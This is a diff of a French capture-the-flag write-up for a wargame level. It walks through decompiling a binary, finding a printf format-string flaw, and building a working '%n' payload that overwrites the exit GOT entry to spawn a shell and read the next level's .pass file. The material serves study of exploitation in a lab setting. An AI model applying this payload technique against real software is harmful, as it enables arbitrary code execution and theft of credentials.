@@ -1,6 +1,6 @@
 Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :
 
-```
+```bash
 $ id && pwd && ls -la
 uid=2045(level5) gid=2045(level5) groups=2045(level5),100(users)
 /home/user/level5
@@ -16,75 +16,50 @@ dr-x--x--x  1 root   root    340 Sep 23  2015 ..
 
 Je tente de lancer le binaire level4 :
 
-```
+```bash
 $ ./level5
-
-```
-
-Il ne répond qu'avec un input :
-
-```
+(waiting for input)
 $ ./level5
 da
 da
 ```
 
-J'utilise [Dogbolt](https://dogbolt.org/?id=ba35d828-02dc-44ac-a188-182a91119498) afin de décompiler le binaire du level 5 :
-
-### Ghidra
+Je recoupe l'analyse ASM du binaire avec GDB des résultats obtenus sur [Dogbolt](https://dogbolt.org/?id=ba35d828-02dc-44ac-a188-182a91119498) et en extrait une version probable du code :
 
 ```c
-void o() {
-  system("/bin/sh");
-  _exit(1);
-}
-
-void n() {
-  char buffer[520];
-  
-  fgets(buffer, 512, stdin);
-  printf(buffer);
-  exit(1);
-}
-
-void main() {
-  n();
-  return;
-}
-```
-
-### Hexray
-
-```c
-void o() {
-  system("/bin/sh");
-  exit(1);
-}
-
-void n() {
-  char buffer[520]; // [esp+10h] [ebp-208h] BYREF
-
-  fgets(buffer, 512, stdin);
-  printf(buffer);
-  exit(1);
-}
-
-int main(int argc, const char **argv, const char **envp)
+void o()
 {
-  n();
+    system("/bin/sh");
+
+    _exit(1);
+}
+
+void n()
+{
+    char buffer[512];
+
+    fgets(buffer, 512, stdin);
+    printf(buffer);
+
+    exit(1);
+}
+
+int main()
+{
+    n();
 }
 ```
 
 Je note les choses suivante :
 
 - `fgets()` est utilisé, et n'est donc pas vulnérable
-- `printf()` est utilisé, probablement expoitable comme le level 3 et 4
+- `printf()` est utilisé, probablement expoitable comme le `level3` et `level4`
 
 Je note un buffer plus grand que ce que `fgets()` lit, mais dans le niveau précédent c'était sans intérêt et je ne m'y intéresserait donc pas ici également. J'estime que la source de vulnérabilité ici est encore `printf()` et qu'il me faut par conséquent appeller la fonction `o()` au travers de cette vulnérabilité, afin d'obtenir le shell et le `.pass` du niveau suivant par extension.
 
 J'obtiens l'adresse de `o()` avec `gdb` :
 
-```
+```h
 (gdb) disas o
 Dump of assembler code for function o:
    0x080484a4 <+0>:     push   %ebp <---------- ici
@@ -110,14 +85,14 @@ Ce type de vulnérabilité exploite le passage entre le `PLT` et le `GOT`, vulga
 
 Il va être pour nous ici question de changer vers quoi :
 
-```
+```h
 (gdb) disas n
 Dump of assembler code for function n:
     ...
    0x080484ff <+61>:    call   0x80483d0 <exit@plt>
 ```
 
-`exit` pointe par son `plt`. Si nous pouvons "faire croire" à l'exécutable qu'`exit` est une fonction qui pointe vers `o()`, alors, au moment du `dynamic linking`, le programme résoudra que le call `exit` pointe vers la `o()` et non la vraie fonction `exit` de la `libc`.
+`exit` pointe par son `plt`. Si nous pouvons "faire croire" à l'exécutable qu'`exit` est une fonction qui pointe vers `o()`, alors, au moment du `dynamic linking`, le programme résoudra que le call `exit` pointe vers la fonction `o()` et non la vraie fonction `exit` de la `libc`.
 
 Pour construire un payload infecté qui effectue ce genre de shenaniganerie, ce dernier devra contenir :
 
@@ -131,7 +106,7 @@ Donner à `exit` comme valeur de pointeur, celle de l'adresse de `o()`.
 
 Première étape, je trouve l'adresse '`plt`' de `exit` :
 
-```
+```h
 (gdb) disas exit
 Dump of assembler code for function exit@plt:
    0x080483d0 <+0>:     jmp    *0x8049838 <----------------- ici
@@ -140,7 +115,7 @@ Dump of assembler code for function exit@plt:
 End of assembler dump.
 ```
 
-Je construit mon payload dans l'optique de l'exploiter comme au level 4, en voici donc la première partie :
+Je construit mon payload dans l'optique de l'exploiter comme au `level4`, en voici donc la première partie :
 
 ```python
 python -c 'print("\x08\x04\x98\x38"[::-1])'
@@ -157,7 +132,7 @@ python -c 'print("\x08\x04\x98\x38"[::-1] + "%134513824p")'
 Il ne me reste plus qu'à utiliser l'exploit avec `%n` afin d'écrire tout ces caractères dans l'adresse d'`exit`.
 Il me faut d'abord trouver avec l'astuce du `%x`, a quelle position se trouve cette adresse dans le contexte de la stack de `printf()` :
 
-```
+```bash
 $ python -c 'print("a %x %x %x %x %x")' | ./level5
 a 200 b7fd1ac0 b7ff37d0 78252061 20782520
                                ^
@@ -172,12 +147,12 @@ C'est donc ici le 4ème argument. Je peux donc conclure mon payload infecté :
 python -c 'print("\x08\x04\x98\x38"[::-1] + "%134513824p" + "%4$n")'
 ```
 
-Pour rappel sur les 3 précédents niveaux. Ces exploits fonctionnent dû au fait que `printf()` lit le buffer que `fgets()` lui donne, qui vient de nous. Cela représente une vulnérabilité car nous pouvons exploiter les formatteur du type : `%n`. Etant donné que ces derniers fonctionnent sur les arguments passés à `printf()`, mais qu'aucun sont présents, nous pouvons donc effectivement arbitrairement changer des valeurs dans la stack.
+Pour rappel sur les 3 précédents niveaux : ces exploits fonctionnent dû au fait que `printf()` lit le buffer que `fgets()` lui donne, qui vient de nous. Cela représente une vulnérabilité car nous pouvons exploiter les formatteur du type : `%n`. Etant donné que ces derniers fonctionnent sur les arguments passés à `printf()`, mais qu'aucun sont présents, nous pouvons donc effectivement arbitrairement changer des valeurs dans la stack.
 
 J'essaye mon payload :
 
-```
-(python -c 'print("\x08\x04\x98\x38"[::-1] + "%134513824p" + "%4$n")' && echo 'cat /home/user/level6/.pass') | ./level5
+```bash
+$ (python -c 'print("\x08\x04\x98\x38"[::-1] + "%134513824p" + "%4$n")' && echo 'cat /home/user/level6/.pass') | ./level5
 ... (134 millions d'espace de padding)
                                                         0x200 (comme pour le level 4, le premier argument de la stack est imprimé, ici 512, la taille du buffer passé en paramètre)
 (puis, la clé est imprimé, ce qui implique que nous avons correctement réussis à exécuter o(), ce qui implique que nous avons correctement réussis à ré-écrire ce vers quoi exit() a été linké, ici, donc, o())
